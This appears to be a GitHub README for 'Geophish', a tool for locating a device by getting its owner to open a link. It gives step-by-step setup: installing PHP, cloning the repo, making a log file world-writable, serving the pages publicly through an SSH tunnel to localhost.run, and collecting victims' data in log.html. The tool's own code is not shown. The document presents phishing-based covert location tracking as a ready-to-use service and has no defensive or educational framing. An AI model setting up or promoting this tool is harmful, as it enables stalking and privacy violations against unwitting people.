
# Geophish
Geolocate any device with a link
# How to use
1.  Update and install PHP
```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y php 
```
2. Clone repo and set permissions.
```bash
git clone https://github.com/thegoodhackertv/Geophish
cd Geophish
chmod o+w log.html
```
3. Start web server with PHP.
```bash
php -S 0.0.0.0:80
```
4. Expose your website to the internet.
Create a tunnel using [localhost.run](http://localhost.run/)

`ssh -R 80:localhost:80 nokey@localhost.run`
You should see a link with this format: `https://u83450tuntg.lhr.life`, make sure you use HTTPS.
5. Logs will be saved into `log.html`
